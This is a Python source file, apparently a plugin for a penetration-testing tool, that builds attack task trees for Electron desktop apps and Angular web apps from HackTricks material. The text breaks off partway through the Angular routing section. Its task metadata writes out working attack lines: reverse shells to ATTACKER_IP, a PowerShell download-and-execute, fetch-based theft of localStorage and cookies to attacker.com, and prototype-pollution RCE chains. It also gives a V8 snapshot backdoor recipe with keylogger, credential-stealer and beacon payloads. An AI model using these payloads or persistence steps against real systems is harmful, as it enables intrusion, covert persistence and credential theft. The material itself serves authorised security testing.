"""
Electron Desktop Application & Angular security testing plugin

Generates tasks for client-side application security including:
- Electron: ASAR extraction, contextIsolation bypass, NodeIntegration RCE, IPC vulnerabilities
- Angular: Template injection, bypassSecurityTrust exploitation, CSP bypass
- Desktop app pentesting: Remote debugging, V8 snapshot tampering, preload script exploitation

Extracted from HackTricks:
  - pentesting-web/electron-desktop-apps/README.md (632 lines)
  - pentesting-web/electron-desktop-apps/electron-contextisolation-rce-via-preload-code.md (93 lines)
  - pentesting-web/electron-desktop-apps/electron-contextisolation-rce-via-ipc.md (110 lines)
  - pentesting-web/electron-desktop-apps/electron-contextisolation-rce-via-electron-internal-code.md (66 lines)
  - pentesting-web/angular.md (619 lines)

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class ElectronDesktopAppsPlugin(ServicePlugin):
    """
    Electron Desktop Apps & Angular security testing plugin

    Generates tasks for client-side application security including:
    - Electron: ASAR extraction, contextIsolation bypass, NodeIntegration RCE, IPC vulnerabilities
    - Angular: Template injection, bypassSecurityTrust exploitation, CSP bypass

    Generated by: CrackPot v1.0
    """

    @property
    def name(self) -> str:
        return "electron-desktop-apps"

    @property
    def default_ports(self) -> List[int]:
        # Desktop apps don't have ports, but Angular may be served on HTTP
        return [80, 443, 3000, 4200, 8080, 8443]

    @property
    def service_names(self) -> List[str]:
        return ['electron', 'desktop-app', 'angular', 'angular-app', 'node-webkit', 'nw.js']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """
        Desktop apps and Angular testing is manually triggered, not auto-detected.
        Returns False to prevent automatic detection.
        User must explicitly request via: crack track manual-plugin electron-desktop-apps
        """
        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Electron/Angular security testing task tree"""

        tasks = {
            'id': f'electron-angular-security',
            'name': 'Electron Desktop Apps & Angular Security Testing',
            'type': 'parent',
            'children': []
        }

        # ========================================
        # PART 1: ELECTRON DESKTOP APP PENTESTING
        # ========================================
        electron_tasks = {
            'id': 'electron-desktop-pentesting',
            'name': 'Electron Desktop Application Security',
            'type': 'parent',
            'children': []
        }

        # 1.1 ASAR Extraction and Code Review
        electron_tasks['children'].append({
            'id': 'asar-extraction',
            'name': 'ASAR Archive Extraction',
            'type': 'command',
            'metadata': {
                'command': 'npx asar extract app.asar destfolder',
                'description': 'Extract Electron app.asar to review source code and configurations',
                'tags': ['OSCP:LOW', 'MANUAL', 'QUICK_WIN'],
                'flag_explanations': {
                    'npx': 'Execute npm package without global install',
                    'asar': 'Electron archive format utility',
                    'extract': 'Extract entire archive',
                    'app.asar': 'Electron application archive (typically in resources/ folder)',
                    'destfolder': 'Output directory for extracted files'
                },
                'success_indicators': [
                    'Files extracted successfully',
                    'main.js found (main process entry point)',
                    'package.json found (lists dependencies and entry point)',
                    'Preload scripts found'
                ],
                'failure_indicators': [
                    'app.asar not found (check resources/ or app/ folder)',
                    'Permission denied (run with sudo or change ownership)',
                    'ASAR corrupt or encrypted'
                ],
                'next_steps': [
                    'Review package.json for "main" entry point',
                    'Analyze main.js for BrowserWindow configurations',
                    'Search for nodeIntegration, contextIsolation, sandbox settings',
                    'Check preload scripts for exposed IPC endpoints',
                    'Search for sensitive data (API keys, credentials)'
                ],
                'alternatives': [
                    'npx asar extract-file app.asar main.js (extract single file)',
                    'npx asar list app.asar (list contents without extraction)',
                    'Manual: 7z x app.asar (some ASAR archives)'
                ],
                'notes': 'ASAR location: Windows: %LOCALAPPDATA%\\\\<AppName>\\\\resources\\\\app.asar | macOS: /Applications/<AppName>.app/Contents/Resources/app.asar | Linux: /opt/<appname>/resources/app.asar'
            }
        })

        # 1.2 Security Configuration Analysis
        electron_tasks['children'].append({
            'id': 'electron-security-config',
            'name': 'Analyze Security Configuration (main.js)',
            'type': 'manual',
            'metadata': {
                'description': 'Review BrowserWindow webPreferences for security misconfigurations',
                'tags': ['OSCP:LOW', 'MANUAL', 'ADVANCED'],
                'flag_explanations': {
                    'nodeIntegration': 'If true: Renderer can use Node.js require() → RCE risk',
                    'contextIsolation': 'If false: Preload/main/renderer share context → prototype pollution RCE',
                    'sandbox': 'If false: NodeJS unrestricted in renderer → attack surface',
                    'webviewTag': 'If true (deprecated): Allows arbitrary preload script loading',
                    'nodeIntegrationInSubFrames': 'If true: iframes can use Node.js (with nodeIntegration)',
                    'enableRemoteModule': 'If true: Renderer can access main process APIs → security risk',
                    'allowRunningInsecureContent': 'If true: HTTPS pages can load HTTP resources',
                    'experimentalFeatures': 'If true: Unstable features enabled'
                },
                'success_indicators': [
                    'nodeIntegration: true found → CRITICAL RCE VECTOR',
                    'contextIsolation: false found → RCE via prototype pollution',
                    'sandbox: false AND nodeIntegration: true → Unrestricted Node access',
                    'Preload script found without contextIsolation',
                    'enableRemoteModule: true → Main process API exposure'
                ],
                'failure_indicators': [
                    'All security settings hardened (nodeIntegration: false, contextIsolation: true, sandbox: true)',
                    'main.js obfuscated/minified',
                    'Cannot locate BrowserWindow configuration'
                ],
                'next_steps': [
                    'If nodeIntegration: true → Test XSS for require("child_process").exec() RCE',
                    'If contextIsolation: false → Test prototype pollution chains',
                    'If preload script exists → Analyze exposed IPC endpoints',
                    'If enableRemoteModule: true → Check for app.relaunch(), shell.openExternal()',
                    'Search for custom protocol handlers (registerProtocolHandler)'
                ],
                'alternatives': [
                    'grep -r "nodeIntegration.*true" destfolder/',
                    'grep -r "contextIsolation.*false" destfolder/',
                    'grep -r "webPreferences" destfolder/main.js'
                ],
                'notes': 'Default since Electron 12: nodeIntegration=false, contextIsolation=true, sandbox=true (if no preload). Legacy apps often have insecure configs.'
            }
        })

        # 1.3 RCE: XSS + nodeIntegration
        electron_tasks['children'].append({
            'id': 'electron-xss-nodeintegration-rce',
            'name': 'RCE via XSS + nodeIntegration',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit XSS in Electron app with nodeIntegration enabled for RCE',
                'tags': ['OSCP:LOW', 'EXPLOIT', 'MANUAL'],
                'flag_explanations': {
                    'require()': 'Node.js module loader (available if nodeIntegration: true)',
                    'child_process': 'Node.js module for executing system commands',
                    '.exec()': 'Execute shell command asynchronously',
                    '.execSync()': 'Execute shell command synchronously (blocks until complete)'
                },
                'success_indicators': [
                    'Calculator app launched (Windows: calc.exe, macOS: Calculator.app)',
                    'Reverse shell connected',
                    'Command output visible in app console',
                    'Process created (verify with ps/Task Manager)'
                ],
                'failure_indicators': [
                    'require is not defined → nodeIntegration disabled',
                    'XSS payload filtered/sanitized',
                    'Content Security Policy blocks inline script',
                    'Renderer crashed (may still execute command before crash)'
                ],
                'next_steps': [
                    'Establish reverse shell: require("child_process").exec("bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1")',
                    'Windows: require("child_process").exec("powershell -c IEX(New-Object Net.WebClient).downloadString(\'http://ATTACKER/shell.ps1\')")',
                    'Enumerate file system: require("fs").readFileSync("/etc/passwd").toString()',
                    'Steal Electron cookies/localStorage: console.log(localStorage)',
                    'Exfiltrate via fetch: fetch("http://attacker.com/steal?data="+btoa(localStorage))'
                ],
                'alternatives': [
                    'Windows: <img src=x onerror="require(\'child_process\').exec(\'calc\')">',
                    'Linux: <img src=x onerror="require(\'child_process\').exec(\'gnome-calculator\')">',
                    'MacOS: <img src=x onerror="require(\'child_process\').exec(\'/System/Applications/Calculator.app/Contents/MacOS/Calculator\')">',
                    'Reverse shell: <img src=x onerror="require(\'child_process\').exec(\'nc -e /bin/bash ATTACKER_IP 4444\')">',
                    'File read: <img src=x onerror="alert(require(\'fs\').readFileSync(\'/etc/passwd\').toString())">'
                ],
                'notes': 'CRITICAL: This is a high-value finding but rare in modern Electron apps. Most apps disable nodeIntegration by default. Test XSS in all input fields, URL parameters, local file loads.'
            }
        })

        # 1.4 RCE: Preload Script Exploitation
        electron_tasks['children'].append({
            'id': 'electron-preload-exploitation',
            'name': 'RCE via Preload Script (contextIsolation: false)',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit exposed IPC/methods from preload script when contextIsolation disabled',
                'tags': ['OSCP:LOW', 'EXPLOIT', 'ADVANCED'],
                'flag_explanations': {
                    'preload': 'Script loaded BEFORE renderer (has full Node.js access)',
                    'contextIsolation': 'When false: Preload objects visible to renderer JS',
                    'window.electronSend': 'Common pattern: Preload exposes IPC sender to renderer',
                    'ipcRenderer': 'Electron IPC (Inter-Process Communication) module',
                    'shell.openExternal': 'Open URL in external browser (RCE risk on file:// URLs)'
                },
                'success_indicators': [
                    'Preload script exports functions to window object',
                    'window.electron* methods accessible from devTools',
                    'IPC handlers accept unsanitized input',
                    'shell.openExternal called with user input → file:// RCE',
                    'Arbitrary IPC events can be sent'
                ],
                'failure_indicators': [
                    'contextIsolation: true → Preload context isolated from renderer',
                    'Preload methods not exposed to window',
                    'IPC handlers validate input properly',
                    'No dangerous methods found (shell.openExternal, child_process)'
                ],
                'next_steps': [
                    'Open devTools: Ctrl+Shift+I or F12',
                    'Check window object for electron* methods: Object.keys(window).filter(k => k.includes("electron"))',
                    'Test exposed IPC: window.electronSend("event-name", "malicious-payload")',
                    'Fuzz IPC handlers: Try download, update, shell, open, exec events',
                    'Check for shell.openExternal: window.electronOpenInBrowser("file:///C:/Windows/System32/calc.exe")',
                    'Analyze preload.js for dangerous patterns: grep -E "ipcRenderer|shell|require" preload.js'
                ],
                'alternatives': [
                    'Prototype pollution bypass (Discord RCE): RegExp.prototype.test = () => false; Array.prototype.join = () => "calc"',
                    'Override built-in methods before preload calls them (contextIsolation: false)',
                    'IPC fuzzing: for(let i=0; i<100; i++){ window.electronSend("event"+i, "test") }',
                    'Check for webview tag: <webview src="https://attacker.com" preload="file://malicious.js"></webview>'
                ],
                'notes': 'Real-world example: Discord RCE (CVE-2020-xxxxx) via RegExp.prototype.test override to hijack execa library. Microsoft Teams RCE via exposed downloadURL IPC endpoint.'
            }
        })

        # 1.5 RCE: contextIsolation Bypass via Prototype Pollution
        electron_tasks['children'].append({
            'id': 'electron-prototype-pollution-rce',
            'name': 'RCE via Prototype Pollution (contextIsolation: false)',
            'type': 'manual',
            'metadata': {
                'description': 'Achieve RCE by polluting built-in prototypes to intercept Electron internal code',
                'tags': ['OSCP:LOW', 'EXPLOIT', 'ADVANCED'],
                'flag_explanations': {
                    'Array.prototype.indexOf': 'Override array search (used by security checks)',
                    'Function.prototype.call': 'Override function calling (intercept internal calls)',
                    'RegExp.prototype.test': 'Override regex matching (bypass validation)',
                    'process.mainModule.require': 'Access to require() from Node process object',
                    'location.reload()': 'Triggers Electron "exit" event (used in exploit chains)'
                },
                'success_indicators': [
                    'Prototype override accepted (no errors)',
                    'Calculator launched after triggering event',
                    'Electron internal code intercepted (process object leaked)',
                    'require() function obtained via polluted prototype chain'
                ],
                'failure_indicators': [
                    'contextIsolation: true → Exploit prevented',
                    'TypeError: prototype is not extensible',
                    'CSP blocks inline script execution',
                    'Object.freeze() applied to critical prototypes'
                ],
                'next_steps': [
                    'Test Array.prototype.indexOf bypass (SAFE_PROTOCOLS check): Array.prototype.indexOf = () => 1337; <a href="file:///C:/Windows/System32/calc.exe">CLICK</a>',
                    'Test Function.prototype.call bypass (exit event): Function.prototype.call = function(process){ process.mainModule.require("child_process").execSync("calc") }; location.reload()',
                    'Discord-style bypass: RegExp.prototype.test = () => false; Array.prototype.join = () => "calc"; DiscordNative.nativeModules.requireModule("discord_utils").getGPUDriverVersions()',
                    'Leak process object: Search for Electron events that pass process as argument',
                    'Monitor network traffic while triggering events (check for command execution)'
                ],
                'alternatives': [
                    'Object.prototype pollution: Object.prototype.shell = require("child_process")',
                    'Override JSON.stringify: JSON.stringify = () => require("child_process").execSync("calc")',
                    'Override console methods: console.log = (args) => require("child_process").exec(args)',
                    'Target specific app methods: Analyze app code for custom functions using prototypes'
                ],
                'notes': 'ADVANCED TECHNIQUE. Requires deep understanding of Electron internals and JavaScript prototype chain. Only works when contextIsolation: false. Examples: Discord RCE (2020), Microsoft Teams RCE (Pwn2Own).'
            }
        })

        # 1.6 IPC Endpoint Fuzzing
        electron_tasks['children'].append({
            'id': 'electron-ipc-fuzzing',
            'name': 'IPC Endpoint Fuzzing and Exploitation',
            'type': 'manual',
            'metadata': {
                'description': 'Fuzz Electron IPC handlers for dangerous operations (download, exec, shell)',
                'tags': ['OSCP:LOW', 'MANUAL', 'ADVANCED'],
                'flag_explanations': {
                    'ipcMain.on': 'Main process IPC event listener (in main.js)',
                    'ipcRenderer.send': 'Renderer process IPC sender (in preload/renderer)',
                    'downloadURL': 'Electron method to download files (RCE if executes after)',
                    'shell.openExternal': 'Opens URL in external program (RCE via file:// or ms-msdt://)',
                    'webContents.executeJavaScript': 'Execute JS in renderer from main (XSS → RCE)'
                },
                'success_indicators': [
                    'IPC handler accepts unsanitized URL → downloadURL + auto-execute RCE',
                    'shell.openExternal called with attacker URL → file:// RCE',
                    'Arbitrary file download to known location',
                    'Command injection in IPC parameters',
                    'Authentication/authorization bypass in IPC handlers'
                ],
                'failure_indicators': [
                    'All IPC handlers validate input properly',
                    'URL whitelist/blacklist enforced',
                    'File downloads restricted to specific paths',
                    'IPC channels require authentication',
                    'No dangerous IPC handlers exposed'
                ],
                'next_steps': [
                    'Grep for IPC handlers: grep -r "ipcMain.on" destfolder/',
                    'Identify dangerous patterns: downloadURL, shell.openExternal, child_process.exec, fs.writeFile',
                    'Test each IPC endpoint: window.electronSend("IPC_EVENT", "payload")',
                    'Common event names: update, download, open, shell, exec, auto-update, getUpdate',
                    'Test protocol handlers: window.open("custom-protocol://malicious")',
                    'Check for webview new-window/will-navigate handlers'
                ],
                'alternatives': [
                    'Automated IPC fuzzing: npm install -g electronegativity && electronegativity -i /path/to/app',
                    'Manual fuzzing: Object.keys(ipcRenderer._events).forEach(e => ipcRenderer.send(e, "test"))',
                    'Burp Suite intercept: Setup HTTP proxy for Electron app (--proxy-server=127.0.0.1:8080)',
                    'Check package.json for IPC libraries: grep -E "ipc|rpc|electron-" package.json'
                ],
                'notes': 'Real-world vulnerable IPC handlers: getUpdate (download + execute), skype-new-window (shell.openExternal), openExternal (file:// RCE), auto-updater endpoints.'
            }
        })

        # 1.7 V8 Snapshot Tampering (CVE-2025-55305)
        electron_tasks['children'].append({
            'id': 'electron-v8-snapshot-backdoor',
            'name': 'V8 Heap Snapshot Tampering (Local Persistence)',
            'type': 'manual',
            'metadata': {
                'description': 'Replace v8_context_snapshot.bin for stealthy local code execution (post-exploitation)',
                'tags': ['OSCP:LOW', 'ADVANCED', 'PERSISTENCE'],
                'flag_explanations': {
                    'v8_context_snapshot.bin': 'Prebuilt V8 heap snapshot loaded at Electron startup',
                    'electron-mksnapshot': 'Tool to compile JS into V8 snapshots',
                    'Array.isArray': 'Ubiquitous gadget function (called frequently in all isolates)',
                    'process.binding()': 'Node.js internal bindings (available in main process)',
                    'isolate': 'V8 JavaScript execution context (main, preload, renderer)'
                },
                'success_indicators': [
                    'Malicious snapshot compiled successfully',
                    'Electron app executes backdoor code on startup',
                    'Gadget function (Array.isArray) hijacked',
                    'Reverse shell connects on app launch',
                    'Keylogger active in renderer context'
                ],
                'failure_indicators': [
                    'Snapshot integrity validation enabled (Electron ≥ post-CVE-2025-55305)',
                    'App installed in admin-only directory (cannot write snapshot)',
                    'Snapshot compilation fails (version mismatch)',
                    'App crashes on startup (malformed snapshot)',
                    'Code signing verification detects tampering'
                ],
                'next_steps': [
                    'Locate snapshot: Windows: %LOCALAPPDATA%\\\\<App>\\\\v8_context_snapshot.bin | macOS: /Applications/<App>.app/Contents/Frameworks/Electron Framework.framework/Resources/',
                    'Create payload.js: const orig = Array.isArray; Array.isArray = function(){ if(process?.pid){ require("child_process").exec("calc"); } return orig(...arguments); };',
                    'Compile: npx -y electron-mksnapshot@<VERSION> "/abs/path/to/payload.js"',
                    'Backup original: cp v8_context_snapshot.bin v8_context_snapshot.bin.bak',
                    'Replace: cp snapshot_blob.bin v8_context_snapshot.bin',
                    'Test: Launch app and verify calc pops',
                    'Production payload: Reverse shell, keylogger, credential stealer'
                ],
                'alternatives': [
                    'Keylogger payload: setInterval(() => { window.onkeydown = (e) => fetch("http://attacker/log?k="+e.key) }, 1000)',
                    'Credential stealer: fetch("http://attacker/creds?data="+btoa(localStorage))',
                    'Isolate detection: if(!process?.pid && alert) { /* renderer context */ } else { /* main context */ }',
                    'Alternative gadget: Object.keys, JSON.stringify, Array.prototype.map',
                    'Persistent HTTP beacon: setInterval(() => fetch("http://attacker/beacon?pid="+process.pid), 60000)'
                ],
                'notes': 'CVE-2025-55305. STEALTHY POST-EXPLOITATION TECHNIQUE. Bypasses code signing and ASAR integrity checks. Requires initial write access to app directory (common on user-writable installs). Detection: Monitor v8_context_snapshot.bin hash changes.'
            }
        })

        # 1.8 Remote Debugging Exploitation
        electron_tasks['children'].append({
            'id': 'electron-remote-debugging',
            'name': 'Remote Debugging Protocol Exploitation',
            'type': 'command',
            'metadata': {
                'command': 'electron ./app --remote-debugging-port=9222 --disable-web-security',
                'description': 'Launch Electron app with remote debugging enabled (if --inspect flag supported)',
                'tags': ['OSCP:LOW', 'MANUAL', 'QUICK_WIN'],
                'flag_explanations': {
                    '--remote-debugging-port': 'Enable Chrome DevTools Protocol on specified port',
                    '--disable-web-security': 'Disable CORS and same-origin policy',
                    '--ignore-certificate-errors': 'Accept self-signed/invalid SSL certs',
                    '--proxy-server': 'Route traffic through proxy for interception'
                },
                'success_indicators': [
                    'DevTools listening on http://localhost:9222',
                    'Can attach chrome://inspect to running process',
                    'JavaScript console accessible remotely',
                    'Can execute arbitrary JS in renderer context'
                ],
                'failure_indicators': [
                    'Remote debugging flag not supported',
                    'Port blocked by firewall',
                    'Authentication required for debugging',
                    'App crashes with debug flags'
                ],
                'next_steps': [
                    'Open chrome://inspect in Chrome/Chromium',
                    'Configure localhost:9222 as discovery target',
                    'Click "inspect" on Electron renderer process',
                    'Execute JS in console: require("child_process").exec("calc") (if nodeIntegration enabled)',
                    'Dump localStorage/cookies for credential theft',
                    'Modify DOM to inject persistent XSS',
                    'Intercept and modify network requests'
                ],
                'alternatives': [
                    'electron ./app --inspect=9229 (Node.js debugging protocol)',
                    'electron ./app --inspect-brk=9229 (break at startup)',
                    'Setup proxy: electron ./app --proxy-server=127.0.0.1:8080',
                    'Certificate bypass: electron ./app --ignore-certificate-errors',
                    'Connect via CLI: chrome-remote-interface --host localhost --port 9222'
                ],
                'notes': 'Requires ability to control app launch arguments. Useful for malware analysis, reverse engineering, or post-exploitation. Check package.json scripts for --inspect flags in dev builds.'
            }
        })

        tasks['children'].append(electron_tasks)

        # ========================================
        # PART 2: ANGULAR SECURITY TESTING
        # ========================================
        angular_tasks = {
            'id': 'angular-security-testing',
            'name': 'Angular Application Security Testing',
            'type': 'parent',
            'children': []
        }

        # 2.1 Angular Detection and Fingerprinting
        angular_tasks['children'].append({
            'id': 'angular-detection',
            'name': 'Angular Framework Detection',
            'type': 'manual',
            'metadata': {
                'description': 'Detect Angular framework, version, and configuration',
                'tags': ['OSCP:LOW', 'MANUAL', 'QUICK_WIN'],
                'flag_explanations': {
                    'ng-app': 'AngularJS (v1.x) directive (legacy)',
                    'ng-version': 'Angular version attribute in DOM',
                    '[ngModel]': 'Angular 2+ two-way data binding',
                    '{{variable}}': 'Angular interpolation syntax',
                    'sourceMappingURL': 'Link to TypeScript source maps (exposes source code)'
                },
                'success_indicators': [
                    'Angular framework detected in HTML/JS',
                    'Version identified from ng-version attribute or console',
                    'Source maps enabled (.js.map files accessible)',
                    'TypeScript source code available via source maps',
                    'main.js or [id].main.js found in dev tools'
                ],
                'failure_indicators': [
                    'No Angular attributes/syntax in HTML',
                    'Source maps disabled (no .map files)',
                    'JavaScript heavily obfuscated/minified',
                    'Angular version not disclosed'
                ],
                'next_steps': [
                    'Check HTML: View source and search for ng-, [ng, {{, }}',
                    'Check console: getAllAngularRootElements()[0].attributes["ng-version"]',
                    'Check dev tools: Look for main.js in Sources/Debugger tab',
                    'Check source maps: curl https://target.com/main.js.map',
                    'Extract source: Find .js.map and decode to TypeScript source',
                    'Analyze routing: Look for app-routing.module.ts for endpoints',
                    'Check app.module.ts for imports and services'
                ],
                'alternatives': [
                    'Wappalyzer browser extension (auto-detect Angular)',
                    'whatweb https://target.com (CLI detection)',
                    'curl https://target.com | grep -E "ng-version|angular"',
                    'Check <script> tags for angular.min.js or main.js',
                    'Check window.ng object in browser console'
                ],
                'notes': 'Angular source maps often enabled in dev/staging environments. Disable in angular.json: "sourceMap": {"scripts": false, "hidden": true}. Source maps expose full TypeScript code + comments.'
            }
        })

        # 2.2 Template Injection via Interpolation
        angular_tasks['children'].append({
            'id': 'angular-template-injection-interpolation',
            'name': 'Template Injection via Interpolation {{}}',
            'type': 'manual',
            'metadata': {
                'description': 'Test for Server-Side/Client-Side Template Injection in Angular interpolation',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                'flag_explanations': {
                    '{{7*7}}': 'Basic math expression (should render as 49 if vulnerable)',
                    '{{constructor.constructor}}': 'Access Function constructor (potential RCE path)',
                    '{{$on.constructor}}': 'AngularJS v1.x sandbox bypass',
                    '[innerHTML]': 'Property binding (bypasses interpolation encoding)',
                    'DomSanitizer.bypassSecurityTrustHtml': 'Angular method to mark HTML as safe'
                },
                'success_indicators': [
                    '{{7*7}} renders as "49" instead of literal text',
                    'Math/logic expression executed',
                    'Error message reveals Angular internals',
                    'Access to Angular scope/context objects',
                    'XSS payload executes via [innerHTML]'
                ],
                'failure_indicators': [
                    '{{7*7}} renders as literal "{{7*7}}" → No template injection',
                    'All interpolation properly encoded',
                    'User input sanitized before template rendering',
                    'CSP blocks inline script execution',
                    'Angular strict mode enabled'
                ],
                'next_steps': [
                    'Test user input fields: Search, comments, profile fields',
                    'Inject {{7*7}} and check if renders as 49',
                    'Try AngularJS sandbox bypass (v1.x): {{constructor.constructor("alert(1)")()}}',
                    'Angular 2+ SSTI: {{_self.env.getFilter("system")("ls")}} (Jinja2-style)',
                    'Check [innerHTML] binding: Inject <img src=x onerror=alert(1)>',
                    'Test URL parameters: ?search={{7*7}}',
                    'Test reflected parameters in Angular templates'
                ],
                'alternatives': [
                    'AngularJS v1.x payloads: {{constructor.constructor("alert(1)")()}}',
                    'AngularJS $eval: {{$eval("alert(1)")}}',
                    'Angular 2+ check: {{constructor}} (should be undefined in strict mode)',
                    'SSTI fuzzing: {{7*\'7\'}}, {{7*7}}, ${7*7}, [[7*7]]',
                    'Property binding bypass: <div [innerHTML]="malicious_var"></div>'
                ],
                'notes': 'Angular 2+ performs context-sensitive encoding by default in {{}}. But [innerHTML] binding sanitizes as HTML context (tags allowed, scripts blocked). SSTI is rare in Angular 2+ unless server-side rendering (SSR) is misconfigured.'
            }
        })

        # 2.3 bypassSecurityTrust Methods Exploitation
        angular_tasks['children'].append({
            'id': 'angular-bypass-security-trust',
            'name': 'bypassSecurityTrust Methods Exploitation',
            'type': 'manual',
            'metadata': {
                'description': 'Exploit unsafe DomSanitizer.bypassSecurityTrust* usage for XSS/RCE',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'EXPLOIT'],
                'flag_explanations': {
                    'bypassSecurityTrustHtml': 'Mark HTML as safe (bypasses XSS sanitization)',
                    'bypassSecurityTrustScript': 'Mark JavaScript as safe (allows <script> execution)',
                    'bypassSecurityTrustUrl': 'Mark URL as safe (allows javascript: URLs)',
                    'bypassSecurityTrustResourceUrl': 'Mark resource URL as safe (allows <script src=...>)',
                    'bypassSecurityTrustStyle': 'Mark CSS as safe (allows style injection)',
                    '[innerHTML]': 'Property binding (uses HTML context sanitization)',
                    '[src]': 'Property binding for URLs (uses URL context sanitization)'
                },
                'success_indicators': [
                    'bypassSecurityTrust* called with user-controlled input',
                    'XSS payload executes via [innerHTML] + bypassSecurityTrustHtml',
                    'javascript: URL executes via [href] + bypassSecurityTrustUrl',
                    '<script> tag executes via [innerHTML] + bypassSecurityTrustScript',
                    'External JavaScript loads via [src] + bypassSecurityTrustResourceUrl'
                ],
                'failure_indicators': [
                    'bypassSecurityTrust* not used in codebase',
                    'User input properly sanitized before bypassSecurityTrust*',
                    'CSP blocks inline script execution',
                    'No user-controlled parameters in bypassSecurityTrust* calls'
                ],
                'next_steps': [
                    'Grep for bypassSecurityTrust: grep -r "bypassSecurityTrust" src/',
                    'Analyze each usage: Check if user input flows to bypassed value',
                    'Test bypassSecurityTrustUrl: <a [href]="trustedUrl">Click</a> with javascript:alert(1)',
                    'Test bypassSecurityTrustHtml: <div [innerHTML]="trustedHtml"></div> with <img src=x onerror=alert(1)>',
                    'Test bypassSecurityTrustResourceUrl: <iframe [src]="trustedResourceUrl"></iframe> with data:text/html,<script>alert(1)</script>',
                    'Check API responses: If JSON contains HTML/URLs, may be trusted by client',
                    'Test URL parameters: ?html=<script>alert(1)</script> (if passed to bypassSecurityTrustHtml)'
                ],
                'alternatives': [
                    'XSS via bypassSecurityTrustUrl: this.sanitizer.bypassSecurityTrustUrl("javascript:alert(document.domain)")',
                    'XSS via bypassSecurityTrustHtml: this.sanitizer.bypassSecurityTrustHtml("<img src=x onerror=alert(1)>")',
                    'Resource load: this.sanitizer.bypassSecurityTrustResourceUrl("https://attacker.com/malicious.js")',
                    'Style injection: this.sanitizer.bypassSecurityTrustStyle("color: red; background: url(http://attacker.com/steal?cookie="+document.cookie+")")',
                    'SVG XSS: bypassSecurityTrustHtml("<svg onload=alert(1)>")'
                ],
                'notes': 'DANGEROUS PATTERN. bypassSecurityTrust* disables Angular\'s built-in XSS protection. Only use with static, developer-controlled values. NEVER use with user input. Check component TypeScript files for DomSanitizer usage.'
            }
        })

        # 2.4 Angular CSP Bypass
        angular_tasks['children'].append({
            'id': 'angular-csp-bypass',
            'name': 'Angular Content Security Policy Bypass',
            'type': 'manual',
            'metadata': {
                'description': 'Bypass Angular CSP via AngularJS sandbox escape or unsafe-eval',
                'tags': ['OSCP:LOW', 'ADVANCED', 'EXPLOIT'],
                'flag_explanations': {
                    "script-src 'unsafe-eval'": 'Allows eval() and Function() (weakens CSP)',
                    "script-src 'unsafe-inline'": 'Allows inline <script> and event handlers',
                    "style-src 'unsafe-inline'": 'Allows inline <style> (CSS-based exfiltration)',
                    'ng-csp': 'AngularJS CSP compatibility mode (disables eval)',
                    'nonce': 'CSP nonce (allows specific inline scripts)',
                    'script-src': 'CSP directive controlling script sources'
                },
                'success_indicators': [
                    "CSP contains 'unsafe-eval' → AngularJS sandbox bypass possible",
                    "CSP contains 'unsafe-inline' → Direct XSS via inline scripts",
                    'No CSP header present → No protection',
                    'CSP nonce predictable/reusable → Nonce bypass',
                    'JSONP endpoint allowed in script-src → Script gadget injection'
                ],
                'failure_indicators': [
                    'Strict CSP: script-src \'self\' with nonces only',
                    'No unsafe-eval or unsafe-inline',
                    'All inline scripts use unpredictable nonces',
                    'No JSONP/script gadgets in allowed domains'
                ],
                'next_steps': [
                    'Check CSP: curl -I https://target.com | grep -i content-security-policy',
                    'Analyze CSP: https://csp-evaluator.withgoogle.com/',
                    'Test unsafe-eval bypass: {{constructor.constructor("alert(1)")()}} (AngularJS)',
                    'Test JSONP gadgets: Check if script-src allows vulnerable domains (Google, Cloudflare, jQuery CDN)',
                    'CSS exfiltration (if style-src unsafe-inline): <style>@import url("http://attacker.com/steal?data="+document.cookie)</style>',
                    'Base-tag injection (bypass script-src): <base href="http://attacker.com/">',
                    'Dangling markup injection (no CSP for meta): <meta http-equiv="refresh" content="0;url=http://attacker.com/steal?data=">'
                ],
                'alternatives': [
                    'AngularJS sandbox bypass (unsafe-eval): {{x=constructor.constructor;x("alert(1)")()}}',
                    'JSONP gadget: <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>',
                    'Script gadget: <script src="https://www.google.com/complete/search?client=chrome&q=x&jsonp=alert(1)"></script>',
                    'DOM clobbering: <form name="x"><input name="y" value="<script>alert(1)</script>"></form> (bypass sanitization)',
                    'CSS exfiltration: background: url("http://attacker.com/log?data="+document.cookie)'
                ],
                'notes': 'CSP bypass requires unsafe-eval (AngularJS only) or unsafe-inline. Modern Angular 2+ does not require unsafe-eval. Check HTML <meta> tag or HTTP response headers for CSP. Use https://csp-evaluator.withgoogle.com/ to find bypasses.'
            }
        })

        # 2.5 Angular Routing and Client-Side Access Control
        angular_tasks['children'].append({
            'id': 'angular-routing-access-control',
            'name': 'Angular Routing & Client-Side Access Control Bypass',
            'type': 'manual',
            'metadata': {
                'description': 'Bypass client-side route guards and access hidden Angular routes',
                'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                'flag_explanations': {
                    'app-routing.module.ts': 'Angular routing configuration file',
                    'canActivate': 'Route guard (checks before navigation)',
                    'canLoad': 'Lazy-loading guard (checks before module load)',
                    'CanDeactivate': 'Exit guard (checks before leaving route)',
                    '{path: \'admin\', component: AdminComponent, canActivate: [AuthGuard]}': 'Protected route example',
                    'RouterModule.forRoot(routes)': 'Root routing configuration'
                },
                'success_indicators': [
                    'app-routing.module.ts accessible via source maps',
                    'Hidden routes discovered (admin, debug, test, dev)',
                    'Client-side route guard bypassed (direct URL navigation)',
                    'Sensitive data exposed in lazy-loaded modules',
                    'Role-based access control only client-side (no server validation)'
                ],
                'failure_indicators': [
                    'All sensitive routes protected server-side',
                    'Source maps disabled (cannot read routing config)',
                    'Route guards enforced both client and server-side',
                    'Direct URL access returns 403/401 from server',
                    'No hidden routes in routing configuration'
                ],
                'next_steps': [
                    'Extract routing config: Download main.js.map and search for "app-routing.module"',
                    'List all routes: Look for path: definitions in routing config',
                    'Test hidden routes: Navigate directly to /admin, /debug, /test, /dev',
                    'Bypass client guards: Open devTools → Application → Clear site data → Navigate to protected route',
